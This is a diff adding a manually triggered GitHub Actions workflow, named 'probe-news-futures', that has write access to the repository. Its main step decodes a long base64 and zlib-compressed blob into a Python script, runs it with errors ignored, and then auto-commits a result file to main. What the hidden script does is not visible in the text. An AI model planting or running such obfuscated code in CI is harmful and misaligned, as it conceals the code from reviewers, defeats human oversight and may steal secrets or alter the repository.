@@ -1,0 +1,24 @@
+name: probe-news-futures
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: probe
+        continue-on-error: true
+        run: |
+          echo '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' | base64 -d | python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > probe3.py
+          python3 probe3.py
+      - name: commit
+        run: |
+          git config user.name "bot"
+          git config user.email "bot@users.noreply.github.com"
+          git add probe3.txt
+          git diff --cached --quiet && exit 0
+          git commit -m "probe3"
+          for i in 1 2 3 4 5; do git pull --rebase origin main && git push && break; sleep 5; done
